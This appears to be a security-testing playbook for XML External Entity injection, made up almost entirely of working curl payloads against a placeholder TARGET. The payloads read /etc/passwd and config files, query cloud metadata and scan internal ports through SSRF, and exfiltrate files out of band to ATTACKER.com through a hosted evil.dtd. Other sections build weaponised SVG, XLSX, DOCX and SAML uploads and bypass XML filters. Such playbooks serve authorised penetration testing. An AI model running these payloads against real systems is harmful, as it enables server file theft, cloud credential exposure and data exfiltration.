# Playbook: XXE (XML External Entity) Testing

## Purpose
Detect and exploit XML External Entity injection for file read, SSRF,
denial of service, and data exfiltration. Covers classic XXE, blind XXE,
and OOB exfiltration techniques.
Input: endpoint accepting XML input (SOAP, REST, file upload, SVG).

---

## Step 1 — Identify XML Input Vectors

```
CHECK EACH:
  1. Content-Type: application/xml or text/xml endpoints
  2. SOAP web services (WSDL)
  3. File uploads accepting XML, XLSX, DOCX, SVG, PDF
  4. RSS/Atom feed parsers
  5. SAML authentication (XML-based SSO)
  6. API endpoints that accept both JSON and XML
  7. Configuration import features
```

```bash
# Check if endpoint accepts XML
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>hello</test>'

# Check JSON endpoint for XML support (content-type switching)
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><email>test@test.com</email></root>'
# If it processes the XML → potential XXE vector
```

---

## Step 2 — Classic XXE File Read

```bash
# /etc/passwd read (Linux)
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'

# Windows file read
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>'

# Application source code
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root><data>&xxe;</data></root>'

# PHP filter for base64 encoded source
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>'
```

---

## Step 3 — XXE to SSRF

```bash
# Internal service enumeration
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>'

# Internal port scanning
for PORT in 80 443 8080 8443 3306 5432 6379 27017; do
  RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{time_total}" \
    -X POST "https://TARGET/api/endpoint" \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"http://127.0.0.1:${PORT}/\">
]>
<root><data>&xxe;</data></root>")
  echo "Port $PORT: $RESP"
done
```

---

## Step 4 — Blind XXE (OOB Exfiltration)

```bash
CALLBACK="https://ATTACKER.com/xxe"

# Step 1: Host a DTD file on attacker server (evil.dtd)
# Contents of evil.dtd:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER.com/?data=%file;'>">
# %eval;
# %exfil;

# Step 2: Trigger external DTD load
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://ATTACKER.com/evil.dtd">
  %xxe;
]>
<root>test</root>'

# Using interactsh for OOB detection
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://UNIQUE_ID.oast.fun">
]>
<root><data>&xxe;</data></root>'
# Check interactsh for DNS/HTTP callback
```

---

## Step 5 — XXE via File Upload

```bash
# SVG with XXE
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
EOF

curl -sk -b "$COOKIE" -X POST "https://TARGET/api/upload" \
  -F "file=@xxe.svg;type=image/svg+xml"

# XLSX with XXE (modify internal XML)
# 1. Create a normal .xlsx file
# 2. Unzip it (xlsx is a zip)
# 3. Edit xl/workbook.xml or [Content_Types].xml
# 4. Add XXE payload
# 5. Rezip as .xlsx

mkdir xxe_xlsx && cd xxe_xlsx
unzip ../normal.xlsx
# Edit [Content_Types].xml — add DTD with entity
zip -r ../xxe.xlsx .
cd ..

curl -sk -b "$COOKIE" -X POST "https://TARGET/api/import" \
  -F "file=@xxe.xlsx"

# DOCX with XXE (same technique)
mkdir xxe_docx && cd xxe_docx
unzip ../normal.docx
# Edit word/document.xml
zip -r ../xxe.docx .
```

---

## Step 6 — SAML XXE

```bash
# SAML assertions are XML — intercept and inject XXE
# In Burp, intercept the SAMLResponse parameter

# Decode SAML (base64)
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# Inject XXE into decoded SAML XML
# Add DOCTYPE with entity before <samlp:Response>
# Re-encode and send

# Common SAML XXE injection point:
# <?xml version="1.0"?>
# <!DOCTYPE foo [
#   <!ENTITY xxe SYSTEM "file:///etc/passwd">
# ]>
# <samlp:Response ...>
#   <saml:Issuer>&xxe;</saml:Issuer>
#   ...
```

---

## Step 7 — XXE Filter Bypass

```bash
# UTF-16 encoding bypass
cat > xxe_utf16.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XMLEOF
iconv -f UTF-8 -t UTF-16 xxe_utf16.xml > xxe_utf16_encoded.xml

# Parameter entity bypass (when regular entities blocked)
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM '"'"'http://ATTACKER.com/?d=%xxe;'"'"'>">
  %eval;
  %send;
]>
<root>test</root>'

# XInclude (when you cannot control DOCTYPE)
curl -sk -X POST "https://TARGET/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>'
```

---

## Output

```
ENDPOINT      : POST /api/import-config
PAYLOAD       : Classic XXE with file:///etc/passwd entity
RESULT        : /etc/passwd contents returned in response
SEVERITY      : CRITICAL — arbitrary file read on server
IMPACT        : Read sensitive files (config, credentials, source code)
                Chain with SSRF for cloud metadata access
EVIDENCE      : [request/response showing file contents]
```

---

## Tools Reference

```bash
# XXEinjector
ruby XXEinjector.rb --host=ATTACKER_IP --file=request.txt --path=/etc/passwd

# Nuclei XXE templates
nuclei -t xxe/ -u "https://TARGET/api/endpoint"
```
